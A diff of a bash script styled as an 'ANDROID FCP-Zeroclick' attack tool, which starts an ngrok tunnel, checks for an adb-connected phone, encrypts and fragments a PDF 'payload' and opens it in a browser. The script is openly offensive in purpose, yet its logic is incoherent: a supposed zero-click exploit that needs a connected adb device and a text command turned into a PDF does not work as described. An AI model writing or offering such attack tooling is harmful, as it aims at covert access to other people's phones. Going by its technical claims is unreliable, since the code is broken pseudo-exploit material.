@@ -1,7 +1,8 @@
 #!/bin/bash
+figlet -c purple "ANDROID FCP-Zeroclick"
 
 # Variables
-NGROK_TUNNEL_URL=$(ngrok status | grep "Forwarding" | awk '{print $6}')
+NGROK_TUNNEL_URL=$(ngrok status | grep "Forwarding" | awk '{print $2}')
 COMMAND_FILE="/tmp/command.txt"
 FRAGMENTED_PDF_PAYLOAD="/tmp/fragmented_pdf_payload"
 
@@ -35,15 +36,19 @@ function fragment_pdf_payload() {
   echo "$fragmented_pdf_payload"
 }
 
+function start_ngrok() {
+  ngrok start 8080
+}
+
 # Main script
 # Set the script to exit on the first error
 set -e
 
-# Check if ngrok is installed
-if ! command -v ngrok &> /dev/null; then
-  echo "ngrok is not installed. Please install ngrok before running this script."
-  exit 1
-fi
+# Start the VPN
+# Replace the following line with the command to start your VPN client
+# openvpn "YOUR_VPN_CONFIG_FILE"
+
+start_ngrok
 
 # Check if an Android device is connected
 if ! adb devices | grep -q device; then
@@ -64,18 +69,8 @@ encrypt_pdf_payload
 # Fragment the PDF payload
 fragmented_pdf_payload=$(fragment_pdf_payload "$pdf_payload.enc")
 
-# Start the VPN
-# Replace the following line with the command to start your VPN client
-# openvpn "YOUR_VPN_CONFIG_FILE"
-
-# Write the scrcpy command to the text file
-echo "scrcpy -d $(get_device_id) --background --auto-connect yes" > "$COMMAND_FILE"
-
-# Convert the text file to a PDF file
-pdftk "$COMMAND_FILE" output "$fragmented_pdf_payload"
-
 # Open the PDF file automatically in the background
-xdg-open "$fragmented_pdf_payload" &
+x-www-browser "$fragmented_pdf_payload" &
 
 # Print the ngrok tunnel URL
 echo "Your ngrok tunnel is $NGROK_TUNNEL_URL"
